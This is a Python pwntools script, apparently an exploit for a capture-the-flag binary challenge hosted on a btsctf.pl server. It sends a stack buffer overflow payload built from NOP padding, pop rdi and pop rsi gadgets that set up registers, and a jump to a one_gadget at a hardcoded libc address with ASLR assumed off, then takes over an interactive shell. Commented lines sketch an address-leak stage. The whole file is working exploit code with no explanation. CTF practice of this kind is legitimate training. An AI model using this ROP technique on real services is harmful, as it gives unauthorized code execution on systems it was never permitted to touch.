#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64")
e = ELF("./chall")

HOST = "mylittlepwny.ch2.btsctf.pl"
PORT = 55124

conn = remote(HOST, PORT)

puts_got = 0x7ffff7e585a0 # no aslr
one_gadget = puts_got + 0x5f6e4

pop_rsi_pop_r15_ret = 0x0000000000401271 
pop_rdi_ret = 0x0000000000401273

payload = b""
payload += asm("nop") * 0x28
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_pop_r15_ret)
payload += p64(0)
payload += p64(0)
payload += p64(one_gadget)
#leak
#payload += p64(pop_rdi_ret)
#payload += p64(one_gadget)
#payload += p64(puts)
conn.sendline(payload)

conn.interactive()

